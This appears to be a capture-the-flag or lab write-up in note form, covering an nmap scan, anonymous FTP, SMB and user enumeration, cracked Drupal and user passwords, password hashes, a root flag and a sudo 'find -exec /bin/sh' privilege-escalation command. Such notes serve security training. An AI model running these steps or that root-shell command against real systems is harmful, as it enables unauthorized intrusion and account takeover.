````
Nmap scan report for 192.168.100.52
Host is up (0.00049s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.100.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 65534    65534         318 Apr 18  2022 updates.txt
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 07:4b:65:c3:47:67:59:0a:cd:09:c2:82:28:c2:d7:31 (RSA)
|   256 72:dd:b0:26:7b:e4:5d:f6:a8:30:b3:2d:2d:7f:ae:4b (ECDSA)
|_  256 3b:09:bf:94:af:6d:3c:77:4b:e6:6c:2d:32:2e:ad:2a (ED25519)
80/tcp   open  http          Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2018-02-21 17:28  drupal/
|_
|_http-title: Index of /
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   Samba smbd 4.13.17-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql         MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
|   Thread ID: 38
|   Capabilities flags: 63486
|   Some Capabilities: SupportsCompression, Support41Auth, SupportsLoadDataLocal, ODBCClient, DontAllowDatabaseTableColumn, LongColumnFlag, FoundRows, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, SupportsTransactions, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: es2=|zn9nB<E&.R6U,v0
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server xrdp
MAC Address: 02:A1:3B:07:D8:37 (Unknown)
Service Info: Hosts: ip-192-168-100-52.eu-central-1.compute.internal, IP-192-168-100-52; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: IP-192-168-100-, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.13.17-Ubuntu)
|   Computer name: ip-192-168-100-52
|   NetBIOS computer name: IP-192-168-100-52\x00
|   Domain name: eu-central-1.compute.internal
|   FQDN: ip-192-168-100-52.eu-central-1.compute.internal
|_  System time: 2024-04-15T00:03:45+00:00
| smb2-time: 
|   date: 2024-04-15T00:03:46
|_  start_date: N/A
`````

192.168.100.52

![[Pasted image 20240414232452.png]]

Greetings gentlemen!

- I have setup the server successfully and have configured Drupal.
- Your Drupal usernames are exactly the same as your user account passwords on this server. Contact me to get your Drupal passwords.
- I was too busy to setup a file sharing server so i will be posting the updates here.

- admin

version = "7.57"
project = "drupal"


 Attempting to map shares on 192.168.100.52
//192.168.100.52/print$ Mapping: DENIED, Listing: N/A
//192.168.100.52/shared Mapping: OK, Listing: OK
//192.168.100.52/IPC$  Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

S-1-22-1-1000 Unix User\ubuntu (Local User)
S-1-22-1-1001 Unix User\auditor (Local User)
S-1-22-1-1002 Unix User\dbadmin (Local User)

ubuntu
auditor
dbadmin
nobody

![[Pasted image 20240415003634.png]]

gentlemen:admin 

![[Pasted image 20240415010155.png]]

![[Pasted image 20240415013014.png]]

DB
drupal:syntex0421

admin
``$S$D67i0qFmSLMLwZ9PU7VEocSS9fvV1JaSeJxQMgCid80hGbq6wXZH``

auditor:qwertyuiop

dbadmin:sayang
``$S$DZcGD5qcb6xso1E/Mu6DJP4uPi5DfY28kBEyuIab8Pod1saBaImN``

Vincenzo:789456 


test
``$S$D5gYYZfqF0sRsA061HU48PvLQGUkIs5BVjVyMXl8APV2ZVW99Nmm``

![[Pasted image 20240415013618.png]]

contraseñas:

qwertyuiop
789456
sayang


ROOT FLAG

c6b7d5f48ac04e959d0a71af56ace9d3

SSH
sudo -l
sudo find . -exec /bin/sh \\; -quit

